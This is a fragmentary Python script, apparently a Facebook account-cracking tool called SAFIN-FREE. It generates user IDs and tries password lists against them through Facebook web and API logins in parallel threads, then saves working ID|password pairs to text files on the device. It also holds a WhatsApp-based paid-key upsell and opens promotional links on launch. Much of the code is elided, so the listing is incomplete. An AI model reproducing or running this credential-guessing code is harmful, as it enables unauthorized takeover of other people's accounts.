...
#Script Churi na koira Nijer joggotay script Bana

from os import path
import os,base64,zlib,pip,urllib
os.system('xdg-open https://www.facebook.com/sylhet.gang.sg.official')
...
logo=("""\033[1;37m
.dP"Y8    db    888888 88 88b 88 
`Ybo."   dPYb   88__   88 88Yb88  \033[1;34m\033[1;37m
o.`Y8b  dP__Yb  88""   88 88 Y88 \033[1;31m\033[1;37m
8bodP' dPYb 88  88     Y8 \033[1;32mŠa FiN\033[1;35m

----------------------------------------------
 Author    : Safin Mohammad 
 Github    : Safin Mohammad 
 Facebook  : Safin Mohammad(Toxic)
 Tool Name : SAFIN-FREE
 Type type : FREE
 Version   : 0.1
----------------------------------------------
 SAFIN Pro version 0.1
 For Haters: Tumar Eto Tuku POWER Nai J Amar Bal Sirba
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://www.facebook.com/profile.php?id=61553470965862');menu()                      
                        elif xd in ['0','00']:
                        ...
                        linex()
                        tks = ("Hi Safin Sir, I Need To Buy Your Paid SAFIN PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python SAFIN.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Safin:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                Safin.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SAFIN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    ...
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"moto g(7) power"',
    ...
    'viewport-width': '980',
                        ...
                        Safin=session.cookies.get_dict().keys()
                        if "c_user" in Safin:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [SAFIN-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SAFIN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Safin:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SAFIN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SAFIN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SAFIN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SAFIN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SAFIN-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SAFIN-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SAFIN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SAFIN-OK] '+uid+' | '+pas+'\033[1;97m')
